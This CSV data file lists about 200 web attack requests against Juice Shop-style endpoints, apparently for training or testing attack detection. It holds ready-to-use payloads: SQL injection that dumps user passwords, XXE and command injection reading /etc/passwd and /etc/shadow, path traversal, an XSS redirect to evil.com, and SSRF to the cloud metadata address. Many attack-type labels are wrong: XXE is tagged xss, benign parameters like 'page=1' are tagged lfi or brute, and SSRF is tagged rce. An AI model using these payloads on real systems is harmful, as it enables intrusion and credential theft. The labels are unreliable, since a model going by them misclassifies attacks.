attack_type,payload,endpoint,http_method,request_body,source_ip
lfi,page=1,/ftp,POST,page=1,192.168.1.190
xss,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/#/search,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.206
lfi,category=juice,/ftp,POST,category=juice,192.168.1.17
lfi,product=1,/profile,GET,product=1,192.168.1.249
xss,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/profile,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.101
lfi,..\..\..\windows\win.ini,/ftp,GET,..\..\..\windows\win.ini,192.168.1.77
brute,sort=price,/rest/admin/application-configuration,GET,sort=price,192.168.1.38
brute,search=apple,/#/search,GET,search=apple,192.168.1.23
sqli,' OR '1'='1' --,/redirect,GET,' OR '1'='1' --,192.168.1.20
xss,<script>document.location='http://evil.com'</script>,/redirect,POST,<script>document.location='http://evil.com'</script>,192.168.1.179
xss,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/#/search,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.217
brute,category=juice,/rest/user/login,GET,category=juice,192.168.1.236
brute,page=1,/rest/basket,POST,page=1,192.168.1.208
xss,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/api/Products,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.106
brute,sort=price,/rest/admin/application-configuration,GET,sort=price,192.168.1.187
sqli,"' UNION SELECT username, password FROM Users--",/redirect,GET,"' UNION SELECT username, password FROM Users--",192.168.1.123
xss,<img src=x onerror=alert(1)>,/ftp,POST,<img src=x onerror=alert(1)>,192.168.1.7
brute,email=user@test.com,/api/Products,GET,email=user@test.com,192.168.1.125
rce,http://169.254.169.254/latest/meta-data/,/rest/basket,POST,http://169.254.169.254/latest/meta-data/,192.168.1.22
lfi,page=1,/ftp,POST,page=1,192.168.1.10
sqli,"' UNION SELECT username, password FROM Users--",/rest/basket,GET,"' UNION SELECT username, password FROM Users--",192.168.1.80
lfi,category=juice,/redirect,GET,category=juice,192.168.1.26
lfi,http://169.254.169.254/latest/meta-data/,/ftp,GET,http://169.254.169.254/latest/meta-data/,192.168.1.151
brute,email=user@test.com,/rest/admin/application-configuration,POST,email=user@test.com,192.168.1.71
brute,search=apple,/rest/basket,POST,search=apple,192.168.1.186
lfi,email=user@test.com,/profile,POST,email=user@test.com,192.168.1.37
brute,category=juice,/rest/basket,POST,category=juice,192.168.1.252
brute,email=user@test.com,/rest/admin/application-configuration,GET,email=user@test.com,192.168.1.66
brute,product=1,/rest/user/login,POST,product=1,192.168.1.183
xss,<img src=x onerror=alert(1)>,/rest/basket,GET,<img src=x onerror=alert(1)>,192.168.1.218
xss,& ping -c 10 127.0.0.1 &,/api/Products,POST,& ping -c 10 127.0.0.1 &,192.168.1.69
xss,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/redirect,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.10
xss,<img src=x onerror=alert(1)>,/rest/user/login,POST,<img src=x onerror=alert(1)>,192.168.1.14
brute,product=1,/rest/basket,GET,product=1,192.168.1.111
sqli,' OR '1'='1' --,/rest/user/login,POST,' OR '1'='1' --,192.168.1.98
lfi,category=juice,/ftp,GET,category=juice,192.168.1.55
brute,sort=price,/rest/admin/application-configuration,POST,sort=price,192.168.1.206
brute,sort=price,/#/search,GET,sort=price,192.168.1.116
brute,sort=price,/#/search,POST,sort=price,192.168.1.88
brute,search=apple,/rest/basket,POST,search=apple,192.168.1.134
lfi,& ping -c 10 127.0.0.1 &,/ftp,GET,& ping -c 10 127.0.0.1 &,192.168.1.176
sqli,' OR '1'='1' --,/#/search,POST,' OR '1'='1' --,192.168.1.34
brute,sort=price,/rest/user/login,GET,sort=price,192.168.1.183
xss,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/#/search,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.128
lfi,search=apple,/redirect,GET,search=apple,192.168.1.188
xss,<script>document.location='http://evil.com'</script>,/ftp,GET,<script>document.location='http://evil.com'</script>,192.168.1.4
lfi,../../../../etc/passwd,/ftp,POST,../../../../etc/passwd,192.168.1.251
brute,category=juice,/rest/admin/application-configuration,POST,category=juice,192.168.1.208
brute,product=1,/rest/basket,POST,product=1,192.168.1.212
lfi,page=1,/profile,POST,page=1,192.168.1.49
xss,<img src=x onerror=alert(1)>,/#/search,GET,<img src=x onerror=alert(1)>,192.168.1.119
brute,sort=price,/rest/admin/application-configuration,POST,sort=price,192.168.1.224
xss,<script>document.location='http://evil.com'</script>,/redirect,POST,<script>document.location='http://evil.com'</script>,192.168.1.23
rce,; cat /etc/shadow,/rest/user/login,POST,; cat /etc/shadow,192.168.1.101
lfi,..\..\..\windows\win.ini,/rest/user/login,POST,..\..\..\windows\win.ini,192.168.1.10
lfi,| ls -la /,/redirect,POST,| ls -la /,192.168.1.199
brute,page=1,/rest/user/login,GET,page=1,192.168.1.234
sqli,"' UNION SELECT username, password FROM Users--",/rest/admin/application-configuration,POST,"' UNION SELECT username, password FROM Users--",192.168.1.31
lfi,search=apple,/ftp,POST,search=apple,192.168.1.137
lfi,search=apple,/profile,POST,search=apple,192.168.1.24
lfi,product=1,/ftp,POST,product=1,192.168.1.86
rce,http://169.254.169.254/latest/meta-data/,/rest/admin/application-configuration,GET,http://169.254.169.254/latest/meta-data/,192.168.1.113
lfi,category=juice,/redirect,POST,category=juice,192.168.1.166
lfi,category=juice,/ftp,GET,category=juice,192.168.1.144
lfi,email=user@test.com,/ftp,POST,email=user@test.com,192.168.1.174
lfi,& ping -c 10 127.0.0.1 &,/profile,POST,& ping -c 10 127.0.0.1 &,192.168.1.72
lfi,search=apple,/profile,GET,search=apple,192.168.1.194
brute,product=1,/api/Products,GET,product=1,192.168.1.246
brute,category=juice,/rest/user/login,GET,category=juice,192.168.1.98
sqli,<script>document.location='http://evil.com'</script>,/rest/user/login,POST,<script>document.location='http://evil.com'</script>,192.168.1.83
brute,product=1,/#/search,POST,product=1,192.168.1.232
lfi,page=1,/profile,GET,page=1,192.168.1.214
lfi,category=juice,/profile,GET,category=juice,192.168.1.223
brute,sort=price,/api/Products,GET,sort=price,192.168.1.207
lfi,../../../../etc/passwd,/rest/basket,GET,../../../../etc/passwd,192.168.1.250
brute,page=1,/rest/admin/application-configuration,GET,page=1,192.168.1.81
brute,search=apple,/rest/basket,POST,search=apple,192.168.1.13
brute,category=juice,/api/Products,GET,category=juice,192.168.1.143
xss,<script>document.location='http://evil.com'</script>,/ftp,POST,<script>document.location='http://evil.com'</script>,192.168.1.167
lfi,../../../../etc/passwd,/profile,POST,../../../../etc/passwd,192.168.1.185
xss,<script>document.location='http://evil.com'</script>,/api/Products,POST,<script>document.location='http://evil.com'</script>,192.168.1.88
brute,product=1,/rest/basket,POST,product=1,192.168.1.187
brute,category=juice,/#/search,GET,category=juice,192.168.1.139
brute,category=juice,/api/Products,POST,category=juice,192.168.1.142
brute,product=1,/rest/admin/application-configuration,POST,product=1,192.168.1.212
brute,email=user@test.com,/rest/basket,GET,email=user@test.com,192.168.1.57
xss,<img src=x onerror=alert(1)>,/rest/admin/application-configuration,GET,<img src=x onerror=alert(1)>,192.168.1.52
lfi,search=apple,/profile,POST,search=apple,192.168.1.87
lfi,../../../../etc/passwd,/rest/admin/application-configuration,POST,../../../../etc/passwd,192.168.1.200
sqli,<script>document.location='http://evil.com'</script>,/rest/admin/application-configuration,POST,<script>document.location='http://evil.com'</script>,192.168.1.112
lfi,sort=price,/profile,POST,sort=price,192.168.1.120
brute,category=juice,/rest/admin/application-configuration,POST,category=juice,192.168.1.154
lfi,category=juice,/profile,GET,category=juice,192.168.1.106
lfi,category=juice,/ftp,POST,category=juice,192.168.1.134
lfi,category=juice,/profile,GET,category=juice,192.168.1.112
xss,<img src=x onerror=alert(1)>,/#/search,POST,<img src=x onerror=alert(1)>,192.168.1.146
brute,sort=price,/rest/user/login,GET,sort=price,192.168.1.94
sqli,"' UNION SELECT username, password FROM Users--",/rest/user/login,GET,"' UNION SELECT username, password FROM Users--",192.168.1.159
sqli,' OR '1'='1' --,/redirect,POST,' OR '1'='1' --,192.168.1.225
sqli,' OR '1'='1' --,/rest/user/login,POST,' OR '1'='1' --,192.168.1.52
sqli,' OR '1'='1' --,/ftp,GET,' OR '1'='1' --,192.168.1.217
lfi,search=apple,/redirect,GET,search=apple,192.168.1.103
xss,; cat /etc/shadow,/rest/basket,POST,; cat /etc/shadow,192.168.1.213
xss,<script>document.location='http://evil.com'</script>,/ftp,GET,<script>document.location='http://evil.com'</script>,192.168.1.125
lfi,page=1,/profile,POST,page=1,192.168.1.193
lfi,search=apple,/profile,POST,search=apple,192.168.1.244
brute,email=user@test.com,/#/search,POST,email=user@test.com,192.168.1.63
brute,sort=price,/rest/admin/application-configuration,GET,sort=price,192.168.1.3
lfi,& ping -c 10 127.0.0.1 &,/redirect,GET,& ping -c 10 127.0.0.1 &,192.168.1.153
brute,sort=price,/api/Products,GET,sort=price,192.168.1.3
lfi,..\..\..\windows\win.ini,/ftp,POST,..\..\..\windows\win.ini,192.168.1.64
sqli,<script>document.location='http://evil.com'</script>,/rest/admin/application-configuration,GET,<script>document.location='http://evil.com'</script>,192.168.1.242
sqli,"' UNION SELECT username, password FROM Users--",/rest/admin/application-configuration,POST,"' UNION SELECT username, password FROM Users--",192.168.1.148
sqli,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/admin/application-configuration,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.195
brute,category=juice,/#/search,GET,category=juice,192.168.1.35
xss,<img src=x onerror=alert(1)>,/rest/user/login,POST,<img src=x onerror=alert(1)>,192.168.1.181
lfi,; cat /etc/shadow,/redirect,GET,; cat /etc/shadow,192.168.1.53
lfi,../../../../etc/passwd,/redirect,GET,../../../../etc/passwd,192.168.1.2
brute,page=1,/rest/basket,POST,page=1,192.168.1.9
brute,category=juice,/rest/admin/application-configuration,GET,category=juice,192.168.1.74
brute,page=1,/rest/user/login,POST,page=1,192.168.1.14
brute,sort=price,/#/search,POST,sort=price,192.168.1.34
xss,| ls -la /,/#/search,GET,| ls -la /,192.168.1.73
xss,; cat /etc/shadow,/#/search,POST,; cat /etc/shadow,192.168.1.220
brute,sort=price,/api/Products,POST,sort=price,192.168.1.157
brute,email=user@test.com,/api/Products,GET,email=user@test.com,192.168.1.48
rce,http://169.254.169.254/latest/meta-data/,/rest/basket,GET,http://169.254.169.254/latest/meta-data/,192.168.1.134
brute,page=1,/rest/admin/application-configuration,POST,page=1,192.168.1.120
lfi,category=juice,/ftp,GET,category=juice,192.168.1.233
sqli,' OR '1'='1' --,/profile,GET,' OR '1'='1' --,192.168.1.38
brute,category=juice,/#/search,GET,category=juice,192.168.1.5
xss,| ls -la /,/api/Products,GET,| ls -la /,192.168.1.154
brute,sort=price,/rest/admin/application-configuration,GET,sort=price,192.168.1.238
sqli,"' UNION SELECT username, password FROM Users--",/rest/basket,POST,"' UNION SELECT username, password FROM Users--",192.168.1.242
xss,<img src=x onerror=alert(1)>,/rest/user/login,GET,<img src=x onerror=alert(1)>,192.168.1.194
lfi,..\..\..\windows\win.ini,/rest/admin/application-configuration,POST,..\..\..\windows\win.ini,192.168.1.126
lfi,search=apple,/ftp,GET,search=apple,192.168.1.50
xss,<img src=x onerror=alert(1)>,/api/Products,GET,<img src=x onerror=alert(1)>,192.168.1.238
rce,http://169.254.169.254/latest/meta-data/,/rest/basket,GET,http://169.254.169.254/latest/meta-data/,192.168.1.34
rce,http://169.254.169.254/latest/meta-data/,/rest/admin/application-configuration,POST,http://169.254.169.254/latest/meta-data/,192.168.1.111
xss,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/profile,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.95
brute,search=apple,/#/search,POST,search=apple,192.168.1.186
brute,category=juice,/rest/admin/application-configuration,GET,category=juice,192.168.1.51
brute,category=juice,/rest/admin/application-configuration,POST,category=juice,192.168.1.228
lfi,product=1,/redirect,POST,product=1,192.168.1.252
lfi,page=1,/redirect,POST,page=1,192.168.1.227
brute,product=1,/rest/user/login,POST,product=1,192.168.1.181
brute,email=user@test.com,/#/search,POST,email=user@test.com,192.168.1.17
xss,& ping -c 10 127.0.0.1 &,/rest/basket,POST,& ping -c 10 127.0.0.1 &,192.168.1.86
rce,http://169.254.169.254/latest/meta-data/,/#/search,POST,http://169.254.169.254/latest/meta-data/,192.168.1.174
brute,email=user@test.com,/api/Products,GET,email=user@test.com,192.168.1.155
lfi,search=apple,/ftp,POST,search=apple,192.168.1.248
lfi,& ping -c 10 127.0.0.1 &,/ftp,GET,& ping -c 10 127.0.0.1 &,192.168.1.179
lfi,page=1,/ftp,POST,page=1,192.168.1.135
lfi,../../../../etc/passwd,/rest/user/login,POST,../../../../etc/passwd,192.168.1.163
xss,<img src=x onerror=alert(1)>,/rest/admin/application-configuration,POST,<img src=x onerror=alert(1)>,192.168.1.166
rce,http://169.254.169.254/latest/meta-data/,/api/Products,GET,http://169.254.169.254/latest/meta-data/,192.168.1.251
brute,search=apple,/rest/user/login,GET,search=apple,192.168.1.147
lfi,sort=price,/redirect,POST,sort=price,192.168.1.112
brute,sort=price,/#/search,POST,sort=price,192.168.1.184
sqli,"' UNION SELECT username, password FROM Users--",/ftp,POST,"' UNION SELECT username, password FROM Users--",192.168.1.83
sqli,"' UNION SELECT username, password FROM Users--",/#/search,GET,"' UNION SELECT username, password FROM Users--",192.168.1.39
lfi,http://169.254.169.254/latest/meta-data/,/redirect,GET,http://169.254.169.254/latest/meta-data/,192.168.1.29
lfi,category=juice,/profile,POST,category=juice,192.168.1.85
brute,product=1,/rest/basket,GET,product=1,192.168.1.204
lfi,product=1,/profile,POST,product=1,192.168.1.86
brute,category=juice,/#/search,GET,category=juice,192.168.1.205
brute,category=juice,/rest/admin/application-configuration,GET,category=juice,192.168.1.196
brute,page=1,/api/Products,GET,page=1,192.168.1.218
lfi,& ping -c 10 127.0.0.1 &,/profile,POST,& ping -c 10 127.0.0.1 &,192.168.1.5
sqli,"' UNION SELECT username, password FROM Users--",/api/Products,GET,"' UNION SELECT username, password FROM Users--",192.168.1.181
sqli,' OR '1'='1' --,/rest/basket,POST,' OR '1'='1' --,192.168.1.146
xss,<img src=x onerror=alert(1)>,/rest/basket,GET,<img src=x onerror=alert(1)>,192.168.1.174
xss,<img src=x onerror=alert(1)>,/rest/basket,POST,<img src=x onerror=alert(1)>,192.168.1.17
lfi,; cat /etc/shadow,/ftp,POST,; cat /etc/shadow,192.168.1.3
brute,search=apple,/rest/basket,GET,search=apple,192.168.1.47
brute,search=apple,/rest/user/login,GET,search=apple,192.168.1.180
brute,product=1,/api/Products,POST,product=1,192.168.1.195
brute,category=juice,/rest/admin/application-configuration,GET,category=juice,192.168.1.183
sqli,' OR '1'='1' --,/rest/basket,POST,' OR '1'='1' --,192.168.1.79
lfi,sort=price,/redirect,GET,sort=price,192.168.1.216
sqli,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/admin/application-configuration,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.91
brute,page=1,/rest/admin/application-configuration,GET,page=1,192.168.1.107
brute,category=juice,/api/Products,POST,category=juice,192.168.1.73
brute,email=user@test.com,/rest/admin/application-configuration,GET,email=user@test.com,192.168.1.34
brute,sort=price,/rest/basket,POST,sort=price,192.168.1.181
lfi,http://169.254.169.254/latest/meta-data/,/ftp,POST,http://169.254.169.254/latest/meta-data/,192.168.1.145
lfi,../../../../etc/passwd,/rest/basket,POST,../../../../etc/passwd,192.168.1.145
brute,email=user@test.com,/rest/user/login,POST,email=user@test.com,192.168.1.241
xss,<img src=x onerror=alert(1)>,/rest/user/login,GET,<img src=x onerror=alert(1)>,192.168.1.203
brute,sort=price,/#/search,GET,sort=price,192.168.1.144
brute,email=user@test.com,/rest/admin/application-configuration,POST,email=user@test.com,192.168.1.4
brute,search=apple,/rest/basket,POST,search=apple,192.168.1.74
brute,sort=price,/rest/user/login,POST,sort=price,192.168.1.41
sqli,"' UNION SELECT username, password FROM Users--",/profile,GET,"' UNION SELECT username, password FROM Users--",192.168.1.167
xss,<img src=x onerror=alert(1)>,/profile,POST,<img src=x onerror=alert(1)>,192.168.1.12
rce,http://169.254.169.254/latest/meta-data/,/rest/admin/application-configuration,GET,http://169.254.169.254/latest/meta-data/,192.168.1.16
brute,email=user@test.com,/api/Products,GET,email=user@test.com,192.168.1.204
xss,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/api/Products,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.27
sqli,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/user/login,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.140
brute,category=juice,/rest/basket,GET,category=juice,192.168.1.120
lfi,search=apple,/redirect,GET,search=apple,192.168.1.239
lfi,../../../../etc/passwd,/#/search,GET,../../../../etc/passwd,192.168.1.199
lfi,sort=price,/ftp,GET,sort=price,192.168.1.226
sqli,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/user/login,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.216
xss,; cat /etc/shadow,/api/Products,POST,; cat /etc/shadow,192.168.1.180
brute,page=1,/api/Products,GET,page=1,192.168.1.198
xss,& ping -c 10 127.0.0.1 &,/rest/basket,POST,& ping -c 10 127.0.0.1 &,192.168.1.173
xss,<script>document.location='http://evil.com'</script>,/profile,GET,<script>document.location='http://evil.com'</script>,192.168.1.136
